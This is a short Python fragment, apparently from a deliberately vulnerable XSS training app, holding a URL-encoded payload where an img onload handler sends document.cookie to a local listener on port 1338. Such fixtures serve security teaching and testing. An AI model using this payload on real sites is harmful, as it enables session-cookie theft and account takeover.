...
def xss(vuln_type, level):
    ...
    if vuln_type == '1':
        if level == 'low':
            ...
            comment = '/xss/1/high?comment=%3Cimg%20onload%3D%5C%27window.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Fmedium%3Fcookie%3D%22%20%2B%20document.cookie%29%5C%27%3E'
